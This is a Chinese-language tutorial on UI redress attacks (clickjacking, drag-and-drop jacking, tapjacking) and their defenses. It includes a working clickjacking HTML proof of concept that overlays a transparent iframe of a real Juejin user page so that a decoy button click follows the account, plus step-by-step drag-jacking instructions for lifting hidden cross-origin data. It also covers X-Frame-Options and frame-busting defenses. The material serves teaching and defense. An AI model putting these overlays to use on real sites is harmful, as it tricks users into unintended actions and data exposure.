# 界面操作劫持

界面操作劫持攻击是一种基于视觉欺骗的 web 会话劫持攻击。

主要原理是通过在网页中可见输入控件上覆盖一个不可见的框（iframe），使得用户误以为在操作可见控制，而实际上用户的操作行为被其不可见的框所劫持，执行了不可见框中的恶意代码，从而窃取隐私数据，或者篡改数据等攻击。

随着 web 功能的演变，可以分为

- 点击劫持 click jacking
- 拖拽劫持 drag&drop jacking
- 触屏劫持 tap jacking

从技术角度讲：

- “覆盖”是指页面元素之间的层次关系, 通过 `z-index` 实现。
- “不可见”指页面透明度为 0 ，通过 `opacity: 0` 实现。
- “框”指的是 iframe。

## 点击劫持 click jacking

页面布局采用绝对定位。然后假设要嵌入的 iframe 的 z-index = 10，那么大部分遮罩层的 z-index 要大于 iframe，才能遮挡。但是关键按钮位置的 z-index 要少于 iframe，但因为 iframe 设置透明，使用可见的仍是它下面的虚拟按钮，但实际点击的却是目标按钮。

这里的示例，是劫持掘金的“关注”按钮。如果未关注的话，点击 replay 按钮将被添加关注。

```html
<!doctype html>
<html lang="zh">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>click jacking</title>
    <style>
      body {
        margin: 0;
        padding: 0;
      }
      button {
        width: 60px;
        height: 23px;
        font-size: 10pt;
        cursor: hand;
        background: #f0f0f0 repeat-x;
        padding-top: 3px;
        border: 1px solid #708090;
      }
      .dd {
        position: absolute;
        /* 要比 iframe 大，才能盖住 */
        z-index: 20;
      }
      #d1 {
        width: 800px;
        height: 200px;
        top: 200px;
        left: 300px;
      }
      #d1 video {
        width: 100%;
        height: 100%;
      }
      #d2 {
        width: 545px;
        height: 50px;
        top: 400px;
        left: 300px;
        background: black;
      }
      #d3 {
        width: 60px;
        height: 50px;
        top: 400px;
        left: 1040px;
        background: black;
      }
      #button_replay {
        width: 100px;
        height: 50px;
        cursor: pointer;
        background: #f0f0f0 repeat-x;
        position: absolute;
        top: 400px;
        left: 840px;
        /* 要比目标位置小，才在目标透明按钮底下 */
        z-index: 5;
      }
      #button_next {
        width: 100px;
        height: 50px;
        cursor: pointer;
        background: #f0f0f0 repeat-x;
        position: absolute;
        top: 400px;
        left: 940px;
        z-index: 20;
      }
      #hidden {
        height: 250px;
        width: 800px;
        top: 200px;
        left: 300px;
        overflow: hidden;
        position: absolute;
        /* 这里仅作演示时设置半透明，实际应为 0 */
        opacity: 0.3;
        /* 基准层 */
        z-index: 10;
        border: 1px solid red;
      }
    </style>
  </head>
  <body>
    <iframe
      id="hidden"
      src="https://juejin.cn/user/2638426139008008"
      scrolling="no"
      frameborder="0"
    ></iframe>
    <div class="dd" id="d1">
      <video src="" controls="controls" preload="auto"></video>
    </div>
    <div class="dd" id="d2"></div>
    <div class="dd" id="d3"></div>
    <button id="button_replay" onclick="alert('Please Wait')">Replay</button>
    <button id="button_next" onclick="alert('Please Next')">Next</button>
  </body>
</html>
```

## 拖拽劫持 drag&drop jacking

在 HTML5 标准中，文本、图片和链接是默认可以拖放的，如果其它元素块要能拖动，需要设置元素 draggable 属性设置为true。
并且 HTML5 中为拖拽操作引入的 dataTransfer 对象用于传递数据。

拖拽劫持之所以有效在于，拖拽可以实现跨域操作。比如将 iframe 框内的元素拖放到当前页面可放置的元素上，以获取隐私数制。但该特性在 chromium 内核的浏览器（chrome / edge）可以拖动但无法放置，在火狐 firefox 浏览器上可以拖放，但 drop 事件对象上的 dataTransfer 属性是 null，无法传递数据。另外拖动过程会显示元素对象，无法有效隐藏。所以该种攻击，在目前大部分浏览器中很难生效。

实现原理：

1. 使用 iframe 嵌入目标网页，目标网页有暴露隐藏数据的漏洞。将 iframe 设置成透明覆盖到能拖动的目标元素上方。
2. 在拖拽放置的终点位置设置一个透明的 textarea，放置在终点位置图片上方
3. 在起点和终点处都加载要同样的图片，超始位置设置透明度为1，终点位置透明度为0。当拖拽放置时，起点位置透明度为0，终点为1。
4. 拖动函数 drag 设置在 iframe 上，drop 设置在 textarea 上。实际拖拽过程，并不是图片拖动，而是图片上方 Iframe 框中的某个目标元素，但因为 iframe 框及元素是透明的，并且通过 js 让图片跟随鼠标移动，等社工和美化手段，让用户以为在拖动图片。
5. 将 iframe 元素拖放到 textarea 中时使用 innerHtml 获取网页代码中的隐藏数据。

## 触屏劫持 tap jacking

基本原理同点击劫持一样，只不过发生场景在移动端访问。

## 漏洞挖掘

界面操作劫持的漏洞挖掘只要确认以下内容即可：

- 目标站点的 HTTP 响应头是否设置了 X-Frame-Options 字段
- 更为简单的方法就是用 iframe 嵌入目标网站试试，如果成功，则说明漏洞存在。

## 漏洞攻击

界面操作劫持是一种社工色彩很强的跨域操作。需要制作一个引入入胜的网页，或者酷炫的交互，引诱用户进行页面操作才能实现攻击。

## 漏洞防御

### X-Frame-Options

根据界面操作劫持的实现原理，最有效的防御措施就是让有重要会话的交互页面不被不可信的外部网站使用 iframe 嵌入。所以现代 web 规范中制定了 X-Frame-Options 头字段来控制。

X-Frame-Options 有两个值可选：

- DENY 禁止被加载进任何 frame 中
- SAMEORIGIN 仅允许被加载进同域的 frame 中

这个 HTTP 响应头被浏览器厂端兼容的很好。那为什么浏览器不强制设置某个值为默认值呢？主要是遗留问题，还有大量早期网站通过 iframe 方式加载第三方域的页面。浏览器标签的每一次进化的第一任务是兼容。

### Frame Busting 脚本防御

主要原理还是让页面无法被 iframe 嵌入。

```html
<style>
  html {
    display: none;
  }
</style>

<script>
  if (self === top) {
    document.documentElement.style.display = "block"
  } else {
    top.location = self.location
  }
</script>
```

代码中的 top 指代主体窗口对象，self 指代当前窗口对象。如果判断页面的主体窗口和当前窗口相同，就将页面恢复可见。不然就将主要窗口的地址设为当前窗口地址。避免了用户的操作实际发生的窗口和所见窗口不一致的情况，防护了利用 iframe 透明层进行操作劫持的攻击。

### 不在网页元素中放置隐私数据。
